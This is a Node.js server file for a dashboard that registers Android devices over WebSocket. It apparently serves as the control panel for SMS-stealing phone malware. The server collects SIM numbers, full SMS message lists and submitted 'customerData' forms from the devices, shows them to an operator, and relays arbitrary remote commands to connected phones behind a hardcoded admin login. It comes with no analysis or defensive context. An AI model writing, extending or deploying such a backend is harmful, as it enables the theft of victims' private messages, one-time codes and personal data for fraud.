require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

let MONGO_URI = process.env.MONGO_URI || '';
if (MONGO_URI) {
    MONGO_URI = MONGO_URI.replace(/\\"/g, '').replace(/;/g, '').trim();
}

let dbConnected = false;

if (!MONGO_URI) { 
    console.error('CRITICAL: MONGO_URI missing'); 
} else {
    mongoose.set('bufferCommands', false);
    mongoose.connect(MONGO_URI, {
      serverSelectionTimeoutMS: 5000,
      connectTimeoutMS: 10000,
      writeConcern: { w: 1 }
    }).then(() => {
      dbConnected = true;
      console.log('✅ MongoDB connected successfully');
    }).catch(err => {
      dbConnected = false;
      console.error('❌ MongoDB connection error:', err.message);
    });
}

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: { type: Number, default: 0 },
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: { type: Boolean, default: false },
  registrationTimestamp: Date,
  customerData: mongoose.Schema.Types.Mixed,
  isDeleted: { type: Boolean, default: false },
  smsMessages: Array
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map();

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (username === 'admin' && password === adminPassword) return res.json({ success: true });
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

app.get('/api/devices', async (req, res) => {
  try {
    if (!dbConnected) return res.json([]);
    const list = await Device.find({ isDeleted: { $ne: true } }).lean();
    console.log(`📊 Dashboard requested devices. Found: ${list.length}`);
    const now = Date.now();
    list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
    res.json(list);
  } catch (err) { res.status(500).json({ error: 'Failed' }); }
});

app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    if (dbConnected) {
      const orQuery = [{ deviceId: deviceId }, { serialNumber: deviceId }];
      if (mongoose.Types.ObjectId.isValid(deviceId)) orQuery.push({ _id: deviceId });
      await Device.deleteMany({ $or: orQuery });
    }
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (err) { return res.status(500).json({ success: false }); }
});

app.post('/api/command', async (req, res) => {
    try {
        const { deviceId, action, data } = req.body || {};
        let device = await Device.findOne({ $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] }).lean();
        const clients = global.deviceSockets.get(deviceId) || global.deviceSockets.get(device?.deviceId);

        if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
            if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
            return res.json({ success: true, isOnline: !!(clients && clients.size > 0), device, messages: device.smsMessages, customerData: device.customerData });
        }
        
        if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device Offline' });
        clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
        return res.json({ success: true, message: 'Command sent' });
    } catch(e) { return res.status(500).json({ success: false }); }
});

server.on('upgrade', (req, socket, head) => {
  if (req.url && req.url.startsWith('/socket.io')) return;
  wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); });
});

wss.on('connection', (ws, req) => {
  console.log('📱 New WebSocket Connection Established');
  ws.isAlive = true;
  ws.on('pong', () => ws.isAlive = true);
  
  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);
      console.log('📩 Received message type:', data.type || 'REGISTRATION', 'from ID:', data.deviceId || data.serialNumber);
      
      const id = data.deviceId || data.serialNumber;
      if (!id) {
          console.warn('⚠️ Received message without deviceId');
          return;
      }

      ws.deviceId = id;
      if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
      global.deviceSockets.get(id).add(ws);

      let batteryVal = parseInt(data.battery);
      if (isNaN(batteryVal)) batteryVal = 0;

      const update = { 
          $set: { 
              deviceId: id, 
              isOnline: true, 
              lastSeen: new Date(),
              model: data.model || 'Unknown',
              androidVersion: data.androidVersion || 'N/A',
              sim1: data.sim1 || 'N/A',
              sim2: data.sim2 || 'N/A',
              battery: batteryVal,
              serialNumber: data.serialNumber || id,
              isDeleted: false // Ensure it's not hidden
          } 
      };

      if (data.type === 'SMS_LIST') update.$set.smsMessages = data.messages;
      if (data.type === 'FORM_SUBMIT') update.$set.customerData = data.customerData;

      if (dbConnected) {
          const result = await Device.findOneAndUpdate(
            { $or: [{ deviceId: id }, { serialNumber: id }] },
            { ...update, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } },
            { upsert: true, new: true, writeConcern: { w: 1 } }
          );
          console.log('💾 Device data saved/updated in DB:', result.deviceId);
          io.emit('dashboard-update');
      }
    } catch (e) { console.error('❌ Error processing message:', e.message); }
  });

  ws.on('close', () => {
    if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
        global.deviceSockets.get(ws.deviceId).delete(ws);
        console.log('🔌 Device connection closed:', ws.deviceId);
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('🚀 Server running on port', PORT));
